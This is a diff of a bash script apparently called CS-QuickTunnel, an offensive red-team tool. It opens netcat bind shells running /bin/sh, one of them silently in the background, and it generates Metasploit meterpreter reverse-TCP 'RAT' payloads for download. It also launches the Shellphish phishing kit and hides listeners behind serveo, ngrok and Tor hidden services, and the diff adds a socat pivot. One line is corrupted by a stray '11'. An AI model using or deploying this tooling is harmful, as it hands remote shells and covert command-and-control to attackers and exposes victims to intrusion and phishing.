@@ -1,5 +1,5 @@
 #!/bin/bash
-# CS-QuickTunnel v0.5.1
+# CS-QuickTunnel v0.5.2
 # Coded by: Cyber Secrets - Information Warfare Center
 # Tool for Red Team ops
 # Github: https://github.com/infosecwriter/CS-QuickTunnel
@@ -11,6 +11,7 @@ trap 'printf "\n";stop;exit 1' 2
 clear
 
 startmenu() {
+	banner
 	default_port="12345"
 	default_server="serveo.net"
 	printf "\e[92m  SSH Tunneling                                              =  1\n"
@@ -18,6 +19,7 @@ startmenu() {
 	if command -v tor > /dev/null 2>&1; then
 		printf "  TOR Tunneling                                              =  3\n"
 	fi
+	printf "  SOCAT Tunneling (Proxy)                                    =  8\n"
 	printf "  Check Dependencies                                         =  9\n"
 	printf "  Run Shellphish @thelinuxchoice                             = 10\n"
 	printf "  Exit                                                       = 99\n"
@@ -39,6 +41,10 @@ startmenu() {
 		3|03)
 			banner
 			menutor
+			;;
+		8|08)
+			banner
+			menusocat
 			;;
 		9|09)
 			printf "\e[93mChecking dependencies"
@@ -66,18 +72,18 @@ startmenu() {
 			cd shellphish
 			clear
 			bash shellphish.sh
-			banner; startmenu
+			startmenu
 			;;
   		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		clear
-		banner
 		startmenu
 		;;
 	esac
 }
 
 menussh() {
+	banner
 	default_port="12345"
 	default_server="serveo.net"
 	printf "\e[92m  Just port forward                                          =  1\n"
@@ -95,7 +101,7 @@ menussh() {
 
 	read -p $'  Choose an option: \e[37;1m' option
 	if [[ $option == 99 ]]; then 
-		banner
+		
 		startmenu
 	fi
 	printf '\e[92mChoose a local listening port (Example:12345)\e[37;1m: ' $default_port
@@ -108,19 +114,20 @@ menussh() {
 		1|01)      
 			printf "\e[1;93m [!] Forwarding local port "$lport" to the "$remote" server!\e[0m\n"
 			serveoitforward
+			menussh
 			;;
 		2|02)      
-			banner
+			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
 			startmenu
 			;;
 		3|03)      
 			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
-			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
+			nc -lvp -p $lport -e /bin/sh > /dev/null 2>&1 &
 			serveoitforward
+			menussh
 			;;
 		10)      
 			serveserveo
-			banner
 			startmenu
 			;;
 	# Metasploit
@@ -132,6 +139,7 @@ menussh() {
 			OSType="Windows"
 			MetasploitMe
 			serveoitforward
+			menussh
 			;;
 		22)      
 			payload="linux/x86/meterpreter/reverse_tcp"
@@ -141,6 +149,7 @@ menussh() {
 			OSType="Linux"
 			MetasploitMe
 			serveoitforward
+			menussh
 			;;
 		23)      
 			payload="osx/x86/shell_reverse_tcp"
@@ -164,7 +173,6 @@ menussh() {
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		sleep
 		clear
-		banner
 		menussh
 		;;
 	esac
@@ -172,6 +180,7 @@ menussh() {
 }
 
 menungrok() {
+	banner
 	default_port="12345"
 	printf "\e[92m  Just port forward through Ngrok.io                         =  1\n"
 	printf "  Run a NetCat listener                                      =  2\n"
@@ -187,7 +196,6 @@ menungrok() {
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
 	if [[ $option == 99 ]]; then 
-		banner
 		startmenu
 	fi
 	printf 'Choose a local listening port (Example:12345): ' $default_server
@@ -253,13 +261,14 @@ menungrok() {
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		sleep
 		clear
-		banner; menungrok
+		menungrok
 		;;
 	esac
 
 }
 
 menutor() {
+	banner
 	default_port="12345"
 	default_server="serveo.net"
 	printf "\e[92m  Tor Hidden Service - Port Forwarding (You run a service)   =  1\n"
@@ -273,13 +282,14 @@ menutor() {
 	read -p $'  Choose an option: \e[37;1m' option
 	printf "\n"
 	if [[ $option == 99 ]]; then 
-		banner
 		startmenu
 	fi
 	case $option in
 		1|01)      
-			banner
+			printf '\e[92mChoose a listening port (Example:12345): \e[37;1m' $default_port
+			read lport
 			toritforward
+			menutor
 			;;
 		2|02)      
 			systemctl restart tor
@@ -290,13 +300,11 @@ menutor() {
 				printf "\e[91mNo .onion address found\n\n\n"
 			fi
 			printf "\e[92mPress ENTER to continue"; read me
-			banner
 			menutor
 			;;
 		7|07)      
 			systemctl restart tor
 			torview
-			banner
 			menutor
 			;;
 		8|08)      
@@ -311,30 +319,79 @@ menutor() {
 			fi
 			hostname=$(cat /var/lib/tor/myservices/hostname)
 			printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Tor hidden service hostname is: \e[37;1m$hostname\n\n\n"; sleep 5
-			banner
 			menutor
 			;;
 		9|09)      
 			systemctl stop tor
 			tordeview
 			systemctl start tor
-			banner
 			menutor	
 			;;
 		10)      
 			printf "\e[1;93m [!] Starting PHP Server on port \e[37;1m"$lport"!\n"
-			banner
 			servetor
 			;;
 		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		sleep 1
 		clear
-		banner
 		menutor
 		;;
 	esac
 }
+
+
+menusocat() {
+	banner
+	default_port="12345"
+	default_server="serveo.net"
+	printf "\e[92m  SSH Port Forwarding                                        =  1\n"
+	printf "  NGROK Port Forwarding                                      =  2\n"
+	printf "  Tor Port Forwarding                                        =  3\n"
+	printf "  Exit                                                       = 99\n"
+	printf "\n"
+	read -p $'  Choose an option: \e[37;1m' option
+	printf "\n"
+	if [[ $option == 99 ]]; then 
+		startmenu
+	fi
+	rserver="serveo.net"
+	default_rrserver="towel.blinkenlights.nl"
+	default_rrport="23"
+	printf '\e[92mChoose a local listening port (Example:12345)\e[37;1m: ' $default_port
+	read lport; lport="${lport:-${default_port}}"
+	printf '\e[92mChoose a remote server to forward/pivot to (Example:Server Name)\e[37;1m: ' $default_rrserver
+	read rrserver; rrserver="${rrserver:-${default_rrserver}}"
+	printf '\e[92mChoose a remote port to forward/pivot to (Example:12345)\e[37;1m: ' $default_rrport
+	read rrport; rrport="${rrport:-${default_rrport}}"
+	socatitforward
+	case $option in
+		1|01)      
+			printf '\e[92mChoose a remote port to pivot from (Example:12345)\e[37;1m: ' $default_port
+			read rport; rport="${rport:-${default_port}}"
+			printf "\n"
+			serveoitforward
+			menussh
+			menusocat
+			;;
+		2|02)  
+			ngrokitforward 
+			menusocat
+			;;
+		3|03)      
+			toritforward
+			read me
+			menusocat
+			;;
+		*)
+		printf "\e[1;93m [!] Invalid option!\e[0m\n"
+		sleep 1
+		clear
+		menutor
+		;;
+	esac
+}
+
 
 MetasploitMe() {
 	read -p $'\e[92mChoose RAT name with ".'$fileext'" extention: ' pname
@@ -385,13 +442,7 @@ torview() {
 	fi
 	if [[ -e /home/kalitor/tor-browser_en-US/start-tor-browser.desktop ]]; then
 		# Stalling while route is built to Tor2Web
-		tortimex=0
-		while [ $tortimex != 30 ]
-		do
-			sleep 1
-			printf "|"
-			let tortimex++
-		done
+		timex
 		curdir=$(pwd)
 		cd /home/kalitor/tor-browser_en-US/
 		printf "\n"; sudo -u kalitor -H ./start-tor-browser.desktop $torhostname $torhostname/installs.php
@@ -410,24 +461,31 @@ torview() {
 	fi
 }
 
+timex() {
+	tortimex=0
+	printf "Resolving Tor Network... "
+	while [ $tortimex != 30 ]
+	do
+		sleep 1
+		printf "|"
+		let tortimex++
+	done
+	printf "\n"
+}
+
 tordeview() {
 	# Kill user & Un-Installing Tor browser
 	killall -u kalitor
 	deluser kalitor	
 	rm -rf /home/kalitor
 	# bleachbit -c --preset
-	banner
-	menutor
 }
 
 toritforward() {
 	# Port forwarding with Tor.  You run the server locally.  We just add the config
+	killall tor > /dev/null 2>&1 
 	aa-complain system_tor
-	systemctl restart tor
-	printf '\e[92mChoose a listening port (Example:12345): \e[37;1m' $default_port
-	read lport
 	lport="${lport:-${default_port}}"
-	sleep 2
 	printf "\e[1;93m [!] Starting Tor Hidden Server on port "$lport"!\e[0m\n"
 	if (grep -Fxq "HiddenServiceDir /var/lib/tor/myservices/" /etc/tor/torrc); then
 	    sleep 1
@@ -441,15 +499,15 @@ toritforward() {
 	fi
 	sed -i 's/#SocksPolicy\ reject\ \*/SocksPolicy\ accept\ \*/g' /etc/tor/torrc
 	killall tor		
-	systemctl restart tor 
-	systemctl status tor
+	systemctl start tor 
 	journalctl -b --no-pager | grep -i tor | tail -n40 | grep -i warn
-	printf "\nSetting up Tor hidden service... \n\n"
+	sleep 5
+	printf "\n\e[92mSetting up Tor hidden service... \n"
 	eip="curl ipinfo.io/ip"
-	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external IP address is: \e[37;1m"
+	printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external Internet IP address is: \e[37;1m"
 	$eip
 	tip="torsocks curl ipinfo.io/ip"
-	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external IP address is: \e[37;1m" 
+	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your Torified external IP address is: \e[37;1m"
 	$tip
 	if [[ $eip == $tip ]]; then
 		printf "\e[31;1mTOR FAILED.  IPs are the SAME!!!"
@@ -457,10 +515,13 @@ toritforward() {
 		read me
 	fi	
 	hostname=$(cat /var/lib/tor/myservices/hostname)
-	printf "Here is the path to fortune: \e[37;1m$hostname:$lport"
+	printf "Here is the path to fortune: \e[37;1m$hostname:$lport\n"
+	timex
+	printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
+	echo 'torsocks nc '$hostname $lport > reverse-tor-connect.sh
+	chmod +x reverse-tor-connect.sh
+	xterm ./reverse-tor-connect.sh &
 	read me
-	banner
-	menutor
 }
 
 ngrokitforward() {
@@ -478,17 +539,26 @@ ngrokitforward() {
 	read waitforngrok
 }
 
+socatitforward() {
+	socat tcp-listen:$lport,reuseaddr,fork TCP:$rrserver:$rrport &
+}
+
 serveoitforward() {
 	if [[ $OSType == "Linux" ]]; then
-		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
+11		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
 		if [[ $testme == "y" || $testme == "Y" ]]; then
 			echo "./site/installs/$pname" > testme.sh
 			bash testme.sh &
 		fi
 	fi
 	printf "\e[92mStarting tunnel...\e[0m\n"
+	printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
+	echo 'sleep 5; nc '$rserver $rport > reverse-ngrok-connect.sh
+	chmod +x reverse-ngrok-connect.sh
+	xterm ./reverse-ngrok-connect.sh &
+	
 	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $rport:localhost:$lport $rserver
-	banner; menussh
+	
 }
 
 serveserveo() {
@@ -526,7 +596,6 @@ servengrok() {
 	firefox $link $link/installs.php
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read waitforngrok
-	banner
 	startmenu
 }
 
@@ -541,6 +610,11 @@ servetor() {
 	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
 	sleep 2
 	printf "\e[1;93m [!] Starting Tor Hidden Server on port "$lport"!\e[0m\n"
+	if (grep -Fxq "HTTPTunnelPort 0.0.0.0:9080" /etc/tor/torrc); then
+	    sleep 1
+	else
+	    echo "HTTPTunnelPort 0.0.0.0:9080" >> /etc/tor/torrc
+	fi
 	if (grep -Fxq "HiddenServiceDir /var/lib/tor/myservices/" /etc/tor/torrc); then
 	    sleep 1
 	else
@@ -550,11 +624,6 @@ servetor() {
 	    sleep 1
 	else
 	    echo "HiddenServicePort $lport 127.0.0.1:$lport" >> /etc/tor/torrc
-	fi
-	if (grep -Fxq "HTTPTunnelPort 0.0.0.0:9080" /etc/tor/torrc); then
-	    sleep 1
-	else
-	    echo "HTTPTunnelPort 0.0.0.0:9080" >> /etc/tor/torrc
 	fi
 	sed -i 's/#SocksPolicy\ reject\ \*/SocksPolicy\ accept\ \*/g' /etc/tor/torrc
 	killall tor		
@@ -581,7 +650,6 @@ servetor() {
 	printf "If the page doesn't load, wait a minute and try again...\n\nPress enter to return to main menu or CTRL+C to end session"
 	
 	read waitfortor
-	banner
 	menutor
 }
 
@@ -607,6 +675,7 @@ stop() {
 		pkill -f -2 tor > /dev/null 2>&1
 		killall tor > /dev/null 2>&1
 	fi
+	killall socat > /dev/null 2>&1
 	killall xterm > /dev/null 2>&1
 	killall -u kalitor
 	rm -rf reverse-connect.sh > /dev/null 2>&1
